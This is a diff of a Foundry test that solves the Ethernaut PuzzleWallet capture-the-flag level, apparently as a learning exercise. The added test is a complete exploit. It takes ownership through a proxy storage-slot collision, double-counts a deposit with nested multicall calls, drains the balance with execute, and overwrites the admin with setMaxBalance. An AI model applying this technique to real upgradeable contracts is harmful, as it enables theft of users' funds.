@@ -9,7 +9,7 @@ import "../src/Ethernaut.sol";
 contract PuzzleWalletTest is Test {
     Ethernaut private _ethernaut;
     PuzzleWalletFactory private _puzzleWalletFactory;
-    PuzzleWallet private _puzzleWallet;
+    PuzzleProxy private _puzzleProxy;
 
     address private _hacker = address(0xA);
 
@@ -17,11 +17,13 @@ contract PuzzleWalletTest is Test {
         vm.deal(_hacker, 1 ether);
         _ethernaut.registerLevel(_puzzleWalletFactory);
         vm.startPrank(_hacker);
-        address instance = _ethernaut.createLevelInstance(_puzzleWalletFactory);
-        _puzzleWallet = PuzzleWallet(instance);
+        address instance = _ethernaut.createLevelInstance{value: 0.001 ether}(
+            _puzzleWalletFactory
+        );
+        _puzzleProxy = PuzzleProxy(payable(instance));
         _;
         bool success = _ethernaut.submitLevelInstance(
-            payable(address(_puzzleWallet))
+            payable(address(_puzzleProxy))
         );
         assertTrue(success);
         vm.stopPrank();
@@ -32,5 +34,41 @@ contract PuzzleWalletTest is Test {
         _puzzleWalletFactory = new PuzzleWalletFactory();
     }
 
-    function testPuzzleWalletHack() public testWrapper {}
+    function testPuzzleWalletHack() public testWrapper {
+        address puzzleProxy = address(_puzzleProxy);
+        _puzzleProxy.proposeNewAdmin(_hacker);
+
+        (bool addToWhitelistSuccess, ) = puzzleProxy.call(
+            abi.encodeWithSignature("addToWhitelist(address)", _hacker)
+        );
+        require(addToWhitelistSuccess, "addToWhitelist failed");
+
+        bytes[] memory data1 = new bytes[](1);
+        data1[0] = abi.encodeWithSignature("deposit()");
+
+        bytes[] memory data2 = new bytes[](2);
+        data2[0] = data1[0];
+        data2[1] = abi.encodeWithSignature("multicall(bytes[])", data1);
+
+        (bool multicallSuccess, ) = puzzleProxy.call{value: 0.001 ether}(
+            abi.encodeWithSignature("multicall(bytes[])", data2)
+        );
+        require(multicallSuccess, "multicall failed");
+
+        (bool executeSuccess, ) = puzzleProxy.call(
+            abi.encodeWithSignature(
+                "execute(address,uint256,bytes)",
+                _hacker,
+                0.002 * 10 ** 18,
+                ""
+            )
+        );
+        require(executeSuccess, "execute failed");
+
+        uint256 newMaxBalance = uint256(uint160(_hacker));
+        (bool setMaxBalanceSuccess, ) = puzzleProxy.call(
+            abi.encodeWithSignature("setMaxBalance(uint256)", newMaxBalance)
+        );
+        require(setMaxBalanceSuccess, "setMaxBalance failed");
+    }
 }
